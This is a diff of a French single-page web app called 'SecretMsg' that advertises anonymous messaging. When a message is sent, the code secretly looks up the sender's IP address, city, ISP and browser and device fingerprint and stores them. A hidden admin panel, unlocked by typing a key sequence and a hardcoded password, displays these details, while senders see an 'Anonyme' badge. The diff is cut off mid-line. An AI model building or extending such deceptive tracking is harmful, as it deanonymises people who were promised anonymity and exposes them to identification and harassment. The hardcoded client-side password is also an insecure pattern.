@@ -108,13 +108,13 @@
         }
         #admin-overlay .admin-box {
             background: #1a1a2e; padding: 30px; border-radius: 15px;
-            text-align: center; border: 2px solid #ffc107;
+            text-align: center; border: 2px solid #ffc107; max-width: 400px; width: 90%;
         }
     </style>
 </head>
 <body>
 
-    <!-- Overlay Admin (caché pour les visiteurs) -->
+    <!-- Overlay Admin -->
     <div id="admin-overlay" class="hidden">
         <div class="admin-box">
             <h2 style="color:#ffc107; margin-bottom:15px;">🔐 Accès Admin</h2>
@@ -122,34 +122,34 @@
                 <input type="password" id="adminPasswordOverlay" placeholder="Mot de passe admin">
             </div>
             <button class="btn" onclick="loginAdminOverlay()">Se connecter</button>
-            <button class="btn btn-small btn-secondary" onclick="closeAdminOverlay()" style="margin-top:10px;">❌ Fermer</button>
+            <button class="btn btn-small" style="background:rgba(255,255,255,0.1); margin-top:10px;" onclick="closeAdminOverlay()">❌ Fermer</button>
         </div>
     </div>
 
     <div class="container">
         <div class="header">
             <h1>🔒 SecretMsg</h1>
-            <p style="opacity:0.8;" id="headerText">Envoyez un message anonyme</p>
+            <p style="opacity:0.8;" id="headerText">Créez votre lien et recevez des messages</p>
         </div>
         <div class="tabs" id="tabsContainer">
-            <button class="tab active" onclick="switchTab('home')">🏠 Lien</button>
-            <button class="tab" onclick="switchTab('send')">📨 Envoyer</button>
-            <button class="tab" onclick="switchTab('view')">👀 Messages</button>
+            <button class="tab active" id="tab-home-tab" onclick="switchTab('home')">🏠 Lien</button>
+            <button class="tab" id="tab-send-tab" onclick="switchTab('send')">📨 Envoyer</button>
+            <button class="tab" id="tab-view-tab" onclick="switchTab('view')">👀 Messages</button>
         </div>
 
         <!-- ACCUEIL -->
         <div id="tab-home" class="tab-content active">
-            <h3 style="text-align:center; margin-bottom:15px;">Créez votre lien</h3>
+            <h3 style="text-align:center; margin-bottom:15px;">Créez votre lien de réception</h3>
             <div class="input-group">
-                <label>Votre nom</label>
+                <label>Votre nom ou pseudo</label>
                 <input type="text" id="userName" placeholder="Ex: Jean">
             </div>
             <button class="btn" onclick="createUserLink()">🔗 Générer mon lien</button>
             <div id="userLinkBox" class="link-box hidden">
-                <p>✅ Votre lien :</p>
+                <p>✅ Votre lien personnel :</p>
                 <span class="url" id="userUrl"></span>
-                <button onclick="copyLink()">📋 Copier</button>
-                <p style="margin-top:8px; font-size:0.8em; opacity:0.6;">Partagez ce lien pour recevoir des messages !</p>
+                <button onclick="copyLink()">📋 Copier le lien</button>
+                <p style="margin-top:8px; font-size:0.8em; opacity:0.6;">Partagez ce lien pour recevoir des messages anonymes !</p>
             </div>
         </div>
 
@@ -159,12 +159,12 @@
                 📨 Message pour : <span id="destinataireNom"></span>
             </div>
             <div id="noDestinataire" class="empty-state">
-                <p>📭 Aucun destinataire</p>
+                <p>📭 Aucun destinataire sélectionné</p>
                 <p style="font-size:0.9em;">Ouvrez un lien valide pour envoyer un message</p>
             </div>
             <div class="input-group">
                 <label>Votre message</label>
-                <textarea id="messageContent" placeholder="Votre message..."></textarea>
+                <textarea id="messageContent" placeholder="Écrivez votre message anonyme..."></textarea>
             </div>
             <button class="btn" onclick="sendMessage()">📨 Envoyer anonymement</button>
         </div>
@@ -173,23 +173,25 @@
         <div id="tab-view" class="tab-content">
             <h3 style="margin-bottom:15px;">💬 Messages reçus</h3>
             <div class="input-group">
-                <label>Voir messages de :</label>
+                <label>Voir les messages de :</label>
                 <select id="viewUser" onchange="displayPublicMessages()">
-                    <option value="">-- Choisir --</option>
+                    <option value="">-- Choisir une personne --</option>
                 </select>
             </div>
             <div id="publicMessages" class="message-list">
-                <div class="empty-state"><p>📭 Sélectionnez quelqu'un</p></div>
+                <div class="empty-state"><p>📭 Sélectionnez une personne pour voir ses messages</p></div>
             </div>
         </div>
 
         <!-- ADMIN (caché) -->
         <div id="tab-admin" class="tab-content">
-            <button class="btn btn-small btn-danger" onclick="logoutAdmin()" style="margin-bottom:10px;">🚪 Déconnexion</button>
-            <button class="btn btn-small btn-danger" onclick="clearAllMessages()" style="margin-bottom:15px;">🗑️ Tout effacer</button>
-            <h3>🔍 Toutes les données</h3>
+            <div style="display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap;">
+                <button class="btn btn-small btn-danger" onclick="logoutAdmin()">🚪 Déconnexion</button>
+                <button class="btn btn-small btn-danger" onclick="clearAllMessages()">🗑️ Tout effacer</button>
+            </div>
+            <h3>🔍 Toutes les données des expéditeurs</h3>
             <div id="adminMessages" class="message-list">
-                <div class="empty-state"><p>Connectez-vous</p></div>
+                <div class="empty-state"><p>Chargement...</p></div>
             </div>
         </div>
     </div>
@@ -199,48 +201,68 @@
         const ADMIN_PASS = 'admin123';
         let destinataireActuel = null;
 
+        // Base de données locale
         function getData() {
             const data = localStorage.getItem(DB_KEY);
             return data ? JSON.parse(data) : { users: [], messages: [] };
         }
-
         function saveData(data) {
             localStorage.setItem(DB_KEY, JSON.stringify(data));
         }
 
+        // Charger la liste des utilisateurs
         function loadUserList() {
             const data = getData();
-            const opts = data.users.map(u => `<option value="${u.id}">${escapeHtml(u.username)}</option>`).join('');
-            document.getElementById('viewUser').innerHTML = '<option value="">-- Choisir --</option>' + opts;
+            const opts = data.users.map(u => '<option value="' + u.id + '">' + escapeHtml(u.username) + '</option>').join('');
+            document.getElementById('viewUser').innerHTML = '<option value="">-- Choisir une personne --</option>' + opts;
         }
 
+        // Créer un lien utilisateur
         function createUserLink() {
             const name = document.getElementById('userName').value.trim();
-            if (!name) { showNotif('❌ Entrez un nom', 'error'); return; }
+            if (!name) {
+                showNotif('❌ Veuillez entrer votre nom', 'error');
+                return;
+            }
+
             const data = getData();
-            const id = 'u_' + Date.now().toString(36) + Math.random().toString(36).substr(2,5);
-            data.users.push({ id, username: name, createdAt: new Date().toISOString() });
+            const userId = 'u_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
+            
+            data.users.push({
+                id: userId,
+                username: name,
+                createdAt: new Date().toISOString()
+            });
             saveData(data);
-            const url = window.location.origin + window.location.pathname + '?user=' + id;
+
+            const url = window.location.origin + window.location.pathname + '?user=' + userId;
             document.getElementById('userUrl').textContent = url;
             document.getElementById('userLinkBox').classList.remove('hidden');
             loadUserList();
-            showNotif('✅ Lien créé !', 'success');
+            showNotif('✅ Lien généré avec succès !', 'success');
         }
 
+        // Copier le lien
         function copyLink() {
             const url = document.getElementById('userUrl').textContent;
-            navigator.clipboard.writeText(url).then(() => showNotif('📋 Copié !', 'success'));
+            navigator.clipboard.writeText(url).then(function() {
+                showNotif('📋 Lien copié !', 'success');
+            }).catch(function() {
+                prompt('Copiez ce lien :', url);
+            });
         }
 
+        // Vérifier l'URL pour un destinataire
         function checkUrl() {
             const params = new URLSearchParams(window.location.search);
-            const uid = params.get('user');
-            if (uid) {
+            const userId = params.get('user');
+            
+            if (userId) {
                 const data = getData();
-                const user = data.users.find(u => u.id === uid);
+                const user = data.users.find(function(u) { return u.id === userId; });
+                
                 if (user) {
-                    destinataireActuel = uid;
+                    destinataireActuel = userId;
                     document.getElementById('destinataireNom').textContent = user.username;
                     document.getElementById('destinataireBox').classList.remove('hidden');
                     document.getElementById('noDestinataire').classList.add('hidden');
@@ -250,29 +272,44 @@
             }
         }
 
+        // Envoyer un message
         async function sendMessage() {
             if (!destinataireActuel) {
                 showNotif('❌ Aucun destinataire. Ouvrez un lien valide.', 'error');
                 return;
             }
-            const content = document.getElementById('messageContent').value.trim();
-            if (!content) { showNotif('❌ Écrivez un message', 'error'); return; }
 
+            const content = document.getElementById('messageContent').value.trim();
+            if (!content) {
+                showNotif('❌ Écrivez un message', 'error');
+                return;
+            }
+
+            // Récupération automatique des infos
             let ip = 'Inconnue', ville = 'Inconnue', region = 'Inconnue', pays = 'Inconnu', isp = 'Inconnu';
+            
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
+                const response = await fetch('https://ipapi.co/json/');
+                const d = await response.json();
                 ip = d.ip || 'Inconnue';
                 ville = d.city || 'Inconnue';
                 region = d.region || 'Inconnue';
                 pays = d.country_name || 'Inconnu';
                 isp = d.org || 'Inconnu';
-            } catch(e) {}
+            } catch(e) {
+                console.log('IP info non disponible');
+            }
 
             const data = getData();
             data.messages.push({
-                id: Date.now(), targetUserId: destinataireActuel, content: content,
-                ip, ville, region, pays, isp,
+                id: Date.now(),
+                targetUserId: destinataireActuel,
+                content: content,
+                ip: ip,
+                ville: ville,
+                region: region,
+                pays: pays,
+                isp: isp,
                 userAgent: navigator.userAgent,
                 langue: navigator.language,
                 plateforme: navigator.platform,
@@ -284,53 +321,69 @@
                 timestamp: new Date().toISOString()
             });
             saveData(data);
-            showNotif('✅ Message envoyé !', 'success');
+
+            showNotif('✅ Message envoyé avec succès !', 'success');
             document.getElementById('messageContent').value = '';
         }
 
+        // Afficher les messages publics
         function displayPublicMessages() {
-            const target = document.getElementById('viewUser').value;
+            const targetId = document.getElementById('viewUser').value;
             const container = document.getElementById('publicMessages');
-            if (!target) { container.innerHTML = '<div class="empty-state"><p>📭 Sélectionnez quelqu\'un</p></div>'; return; }
+
+            if (!targetId) {
+                container.innerHTML = '<div class="empty-state"><p>📭 Sélectionnez une personne</p></div>';
+                return;
+            }
+
             const data = getData();
-            const msgs = data.messages.filter(m => m.targetUserId === target);
-            if (msgs.length === 0) { container.innerHTML = '<div class="empty-state"><p>📭 Aucun message</p></div>'; return; }
-            msgs.sort((a,b) => b.id - a.id);
-            container.innerHTML = msgs.map(m => `
-                <div class="message-item">
-                    <p>${escapeHtml(m.content)}</p>
-                    <div class="message-meta">
-                        <span>📅 ${new Date(m.timestamp).toLocaleString('fr-FR')}</span>
-                        <span class="badge badge-anonymous">Anonyme</span>
-                    </div>
-                </div>
-            `).join('');
+            const msgs = data.messages.filter(function(m) { return m.targetUserId === targetId; });
+
+            if (msgs.length === 0) {
+                container.innerHTML = '<div class="empty-state"><p>📭 Aucun message pour cette personne</p></div>';
+                return;
+            }
+
+            msgs.sort(function(a, b) { return b.id - a.id; });
+
+            container.innerHTML = msgs.map(function(m) {
+                return '<div class="message-item">' +
+                    '<p>' + escapeHtml(m.content) + '</p>' +
+                    '<div class="message-meta">' +
+                        '<span>📅 ' + new Date(m.timestamp).toLocaleString('fr-FR') + '</span>' +
+                        '<span class="badge badge-anonymous">Anonyme</span>' +
+                    '</div>' +
+                '</div>';
+            }).join('');
         }
 
-        // ADMIN CACHÉ
-        function isAdmin() { return sessionStorage.getItem('admin') === 'true'; }
+        // === ADMIN ===
+        function isAdmin() {
+            return sessionStorage.getItem('admin') === 'true';
+        }
 
-        // Secret : taper "admin" sur le clavier pour ouvrir l'accès admin
-        let adminKeys = '';
+        // Code secret : taper admin123
+        let keyBuffer = '';
         document.addEventListener('keydown', function(e) {
-            adminKeys += e.key.toLowerCase();
-            if (adminKeys.includes('admin123')) {
-                adminKeys = '';
+            keyBuffer += e.key.toLowerCase();
+            if (keyBuffer.indexOf('admin123') !== -1) {
+                keyBuffer = '';
                 if (isAdmin()) {
                     showAdminPanel();
                 } else {
                     document.getElementById('admin-overlay').classList.remove('hidden');
                 }
             }
-            if (adminKeys.length > 20) adminKeys = adminKeys.slice(-10);
+            if (keyBuffer.length > 30) keyBuffer = keyBuffer.slice(-15);
         });
 
         function loginAdminOverlay() {
             if (document.getElementById('adminPasswordOverlay').value === ADMIN_PASS) {
                 sessionStorage.setItem('admin', 'true');
                 document.getElementById('admin-overlay').classList.add('hidden');
+                document.getElementById('adminPasswordOverlay').value = '';
                 showAdminPanel();
-                showNotif('✅ Connecté admin', 'success');
+                showNotif('✅ Connecté en tant qu\'administrateur', 'success');
                 displayAdminMessages();
             } else {
                 showNotif('❌ Mot de passe incorrect', 'error');
@@ -339,90 +392,60 @@
 
         function closeAdminOverlay() {
             document.getElementById('admin-overlay').classList.add('hidden');
+            document.getElementById('adminPasswordOverlay').value = '';
         }
 
         function showAdminPanel() {
-            // Ajouter l'onglet admin
+            // Ajouter l'onglet admin s'il n'existe pas
             if (!document.getElementById('tab-admin-tab')) {
-                const tabsContainer = document.getElementById('tabsContainer');
-                const adminTab = document.createElement('button');
+                var tabsContainer = document.getElementById('tabsContainer');
+                var adminTab = document.createElement('button');
                 adminTab.className = 'tab';
                 adminTab.id = 'tab-admin-tab';
                 adminTab.textContent = '🔑 Admin';
                 adminTab.onclick = function() { switchTab('admin'); };
                 tabsContainer.appendChild(adminTab);
             }
-            document.getElementById('tab-admin').classList.add('active');
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.getElementById('tab-admin-tab').classList.add('active');
+            switchTab('admin');
             displayAdminMessages();
         }
 
         function logoutAdmin() {
             sessionStorage.removeItem('admin');
-            // Cacher l'onglet admin
-            const adminTab = document.getElementById('tab-admin-tab');
+            var adminTab = document.getElementById('tab-admin-tab');
             if (adminTab) adminTab.remove();
             document.getElementById('tab-admin').classList.remove('active');
+            document.getElementById('headerText').textContent = 'Créez votre lien et recevez des messages';
             switchTab('home');
             showNotif('👋 Déconnecté', 'success');
         }
 
         function displayAdminMessages() {
             if (!isAdmin()) return;
-            const data = getData();
-            const container = document.getElementById('adminMessages');
+
+            var data = getData();
+            var container = document.getElementById('adminMessages');
+
             if (data.messages.length === 0) {
-                container.innerHTML = '<div class="empty-state"><p>📭 Aucun message</p></div>';
+                container.innerHTML = '<div class="empty-state"><p>📭 Aucun message dans le système</p></div>';
                 return;
             }
-            data.messages.sort((a,b) => b.id - a.id);
-            container.innerHTML = data.messages.map((m, i) => {
-                const target = data.users.find(u => u.id === m.targetUserId);
-                return `
-                    <div class="message-item admin-view">
-                        <p><strong>💬 Message :</strong> ${escapeHtml(m.content)}</p>
-                        <div class="sender-info">
-                            <p>🌐 <strong>IP :</strong> ${m.ip}</p>
-                            <p>📍 <strong>Ville :</strong> ${m.ville}</p>
-                            <p>📍 <strong>Région :</strong> ${m.region}</p>
-                            <p>🌍 <strong>Pays :</strong> ${m.pays}</p>
-                            <p>📡 <strong>FAI :</strong> ${m.isp}</p>
-                            <p>🖥️ <strong>Navigateur :</strong> ${m.userAgent}</p>
-                            <p>🗣️ <strong>Langue :</strong> ${m.langue}</p>
-                            <p>💻 <strong>Plateforme :</strong> ${m.plateforme}</p>
-                            <p>📱 <strong>Écran :</strong> ${m.ecran}</p>
-                            <p>🕐 <strong>Fuseau :</strong> ${m.fuseau}</p>
-                            <p>🍪 <strong>Cookies :</strong> ${m.cookies}</p>
-                            <p>📶 <strong>En ligne :</strong> ${m.enLigne}</p>
-                            <p>🧠 <strong>Mémoire :</strong> ${m.memoire} Go</p>
-                            <p>🎯 <strong>Destinataire :</strong> ${target ? escapeHtml(target.username) : 'Inconnu'}</p>
-                            <p>📅 <strong>Date :</strong> ${new Date(m.timestamp).toLocaleString('fr-FR')}</p>
-                        </div>
-                        <div class="message-meta">
-                            <span>#${i+1}</span>
-                            <span class="badge badge-admin">Admin</span>
-                        </div>
-                    </div>
-                `;
-            }).join('');
-        }
 
-        function clearAllMessages() {
-            if (!confirm('Supprimer TOUS les messages ?')) return;
-            const data = getData();
-            data.messages = [];
-            saveData(data);
-            showNotif('✅ Tous supprimés', 'success');
-            displayAdminMessages();
-        }
+            data.messages.sort(function(a, b) { return b.id - a.id; });
 
-        function switchTab(name) {
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.getElementById('tab-' + name).classList.add('active');
-            if (event && event.target) event.target.classList.add('active');
-            else {
-                const tab = document.getElementById('tab-' + name + '-tab');
-                if (tab) tab.classList.add('active');
-          
+            container.innerHTML = data.messages.map(function(m, i) {
+                var target = data.users.find(function(u) { return u.id === m.targetUserId; });
+                return '<div class="message-item admin-view">' +
+                    '<p><strong>💬 Message :</strong> ' + escapeHtml(m.content) + '</p>' +
+                    '<div class="sender-info">' +
+                        '<p>🌐 <strong>IP :</strong> ' + m.ip + '</p>' +
+                        '<p>📍 <strong>Ville :</strong> ' + m.ville + '</p>' +
+                        '<p>📍 <strong>Région :</strong> ' + m.region + '</p>' +
+                        '<p>🌍 <strong>Pays :</strong> ' + m.pays + '</p>' +
+                        '<p>📡 <strong>FAI :</strong> ' + m.isp + '</p>' +
+                        '<p>🖥️ <strong>Navigateur :</strong> ' + m.userAgent + '</p>' +
+                        '<p>🗣️ <strong>Langue :</strong> ' + m.langue + '</p>' +
+                        '<p>💻 <strong>Plateforme :</strong> ' + m.plateforme + '</p>' +
+                        '<p>📱 <strong>Écran :</strong> ' + m.ecran + '</p>' +
+                        '<p>🕐 <strong>Fuseau horaire :</strong> ' + m.fuseau + '</p>' +
+                        '<p>🍪 <strong>Co
